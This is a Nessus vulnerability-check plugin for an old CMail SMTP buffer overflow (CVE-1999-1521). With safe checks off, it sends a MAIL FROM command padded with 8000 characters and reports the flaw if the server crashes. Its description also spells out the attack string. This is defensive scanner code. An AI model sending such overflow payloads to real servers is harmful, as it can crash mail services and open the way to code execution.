#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(10047);
 script_version ("$Revision: 1.34 $");
 script_cve_id("CVE-1999-1521");
 script_bugtraq_id(633);
 script_xref(name:"OSVDB", value:"40");
 
 script_name(english:"CMail MAIL FROM Command Remote Overflow");
 script_summary(english:"Overflows a buffer in the remote mail server");
 
 script_set_attribute(
   attribute:"synopsis",
   value:"The remote mail server has a buffer overflow vulnerability."
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
      "The remote host appears to be running a vulnerable version of CMail.\n",
      "Issuing a long argument to the 'MAIL FROM' command can result in a\n",
      "buffer overflow.  An attack would look something similar to :\n",
      "\n",
      "  MAIL FROM: AAA[...]AAA@nessus.org\n",
      "\n",
      "Where AAA[...]AAA contains more than 8000 'A's.\n",
      "\n",
      "A remote attacker could exploit this issue to crash the mail server,\n",
      "or possibly to execute arbitrary code."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/bugtraq/1999-q3/1429.html"
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://marc.info/?l=bugtraq&m=93720402717560&w=2"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Contact the vendor for a fix."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C"
 );
 script_end_attributes();

 script_category(ACT_MIXED_ATTACK); # mixed
 script_family(english:"SMTP problems");
 
 script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");
 
 script_dependencie("find_service1.nasl", "smtpserver_detect.nasl", "tfs_smtp_overflow.nasl");
 script_exclude_keys("SMTP/wrapped","SMTP/3comnbx");
 script_require_ports("Services/smtp", 25);
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("smtp_func.inc");

if (report_paranoia < 2) exit(0);

port = get_kb_item("Services/smtp");
if(!port)port = 25;
if (get_kb_item('SMTP/'+port+'/broken')) exit(0);

if(safe_checks())
{
 banner = get_smtp_banner(port:port);
  
  if(banner)
  {
  if(egrep(pattern:"CMail Server Version: 2\.[0-4]",
  	  string:banner))
	  {
	   alrt  = 
"Nessus reports this vulnerability using only information that was 
gathered. Use caution when testing without safe checks enabled.";

	  security_hole(port:port, extra:alrt);
	  }
  }
  exit(0);
 }



if(get_port_state(port))
{
 key = get_kb_item(string("SMTP/", port, "/mail_from_overflow"));
 if(key)exit(0); 
 soc = open_sock_tcp(port);
 if(soc)
 {
 data = smtp_recv_banner(socket:soc);
 crp = string("HELO example.com\r\n");
 send(socket:soc, data:crp);
 data = recv_line(socket:soc, length:1024);
 if("250 " >< data)
 {
 crp = string("MAIL FROM: ", crap(8000), "@", get_host_name(), "\r\n");
 send(socket:soc, data:crp);
 buf = recv_line(socket:soc, length:1024);
 if(!buf){
  close(soc);
  soc = open_sock_tcp(port);
  if(soc) s = smtp_recv_banner(socket:soc);
  else s = NULL;
  
  if(!s) security_hole(port);
  }
 }
 close(soc);
 }
}
